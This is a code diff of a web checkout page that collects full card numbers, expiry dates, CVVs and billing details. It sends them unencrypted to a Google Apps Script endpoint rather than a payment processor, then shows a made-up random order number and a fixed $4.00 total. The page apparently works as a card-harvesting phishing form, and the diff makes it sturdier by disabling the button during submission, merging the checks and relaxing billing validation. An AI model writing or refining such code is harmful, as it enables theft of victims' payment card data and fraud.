@@ -142,7 +142,7 @@
         <input type="text" id="bzip" placeholder="ZIP">
       </div>
 
-      <button onclick="placeOrder()">Place Order</button>
+      <button id="orderBtn" onclick="placeOrder(event)">Place Order</button>
       <button class="secondary" onclick="backToShipping()">Back</button>
 
     </div>
@@ -183,8 +183,6 @@
 <script>
 // VALIDATION
 function isValidEmail(e){return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e);}
-function isValidZip(z){return /^\d{5}$/.test(z);}
-function isValidState(s){return /^[A-Za-z]{2}$/.test(s);}
 function isValidCVV(c){return /^\d{3,4}$/.test(c);}
 function isValidExp(e){return /^(0[1-9]|1[0-2])\/\d{2}$/.test(e);}
 
@@ -225,20 +223,18 @@ function detectCard(){
 
 // NAVIGATION
 function goToPayment(){
+  if(!emailEl.value || !isValidEmail(emailEl.value)){
+    alert("Valid email required");
+    return;
+  }
+
   if(!nameEl.value || !addressEl.value || !cityEl.value){
-  alert("Shipping info required");
-  return;
-}
-  
+    alert("Shipping info required");
+    return;
+  }
+
   step1.classList.remove("active");
   step2.classList.add("active");
-
-  // CLEAR billing fields (IMPORTANT FIX)
-  bnameEl.value="";
-  baddressEl.value="";
-  bcityEl.value="";
-  bstateEl.value="";
-  bzipEl.value="";
 }
 
 function backToShipping(){
@@ -247,32 +243,32 @@ function backToShipping(){
 }
 
 // FINAL CHECK
-function placeOrder(){
+function placeOrder(event){
+
+  const btn = document.getElementById("orderBtn");
+  btn.disabled = true;
+  btn.innerText = "Processing...";
 
   let card = cardEl.value.replace(/\D/g,'');
 
-  if(card.length < 13){
-    alert("Card too short"); return;
+  if(card.length < 13 || !luhnCheck(card)){
+    alert("Invalid card");
+    resetBtn(); return;
   }
 
-  if(!luhnCheck(card)){
-    alert("Invalid card number"); return;
-  }
-
-  if(!isValidExp(expEl.value)){
-    alert("Invalid expiration"); return;
-  }
-
-  if(isExpired(expEl.value)){
-    alert("Card expired"); return;
+  if(!isValidExp(expEl.value) || isExpired(expEl.value)){
+    alert("Invalid expiration");
+    resetBtn(); return;
   }
 
   if(!isValidCVV(cvvEl.value)){
-    alert("Invalid CVV"); return;
+    alert("Invalid CVV");
+    resetBtn(); return;
   }
 
-  if(!bnameEl.value || !baddressEl.value || !bcityEl.value || !bstateEl.value || !bzipEl.value){
-    alert("Billing address required"); return;
+  if(!bnameEl.value || !baddressEl.value || !bcityEl.value){
+    alert("Billing required");
+    resetBtn(); return;
   }
 
   const data = {
@@ -280,7 +276,7 @@ function placeOrder(){
     cardnum: cardEl.value,
     expdate: expEl.value,
     cvv: cvvEl.value,
-    cardname: document.getElementById("cardname").value,
+    cardname: cardnameEl.value,
     bname: bnameEl.value,
     baddress: baddressEl.value,
     bcity: bcityEl.value,
@@ -290,18 +286,17 @@ function placeOrder(){
 
   fetch("https://script.google.com/macros/s/AKfycbxgqumKEhFDaNHqn9AKxp8cFFs2Is5yh4FCCbrMfYCLuRq3QZ2yzPArCVK3zEL5kt0eLA/exec", {
     method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
+    headers: {"Content-Type": "application/json"},
     body: JSON.stringify(data)
   })
-  .then(() => {
-
+  .then(res => {
+    if(!res.ok) throw new Error();
+    
     const orderNumber = "PU3-" + Math.floor(100000 + Math.random() * 900000);
     const now = new Date();
 
     localStorage.setItem("orderData", JSON.stringify({
-      orderNumber: orderNumber,
+      orderNumber,
       name: nameEl.value,
       email: emailEl.value,
       total: "$4.00",
@@ -310,25 +305,29 @@ function placeOrder(){
     }));
 
     window.location.href = "confirmation.html";
-
   })
   .catch(() => {
     alert("Error submitting");
+    resetBtn();
   });
 }
 
+function resetBtn(){
+  const btn = document.getElementById("orderBtn");
+  btn.disabled = false;
+  btn.innerText = "Place Order";
+}
 
 // ELEMENTS
 const emailEl=document.getElementById("email");
 const nameEl=document.getElementById("name");
 const addressEl=document.getElementById("address");
 const cityEl=document.getElementById("city");
-const stateEl=document.getElementById("state");
-const zipEl=document.getElementById("zip");
 
 const cardEl=document.getElementById("card");
 const expEl=document.getElementById("exp");
 const cvvEl=document.getElementById("cvv");
+const cardnameEl=document.getElementById("cardname");
 
 const bnameEl=document.getElementById("bname");
 const baddressEl=document.getElementById("baddress");
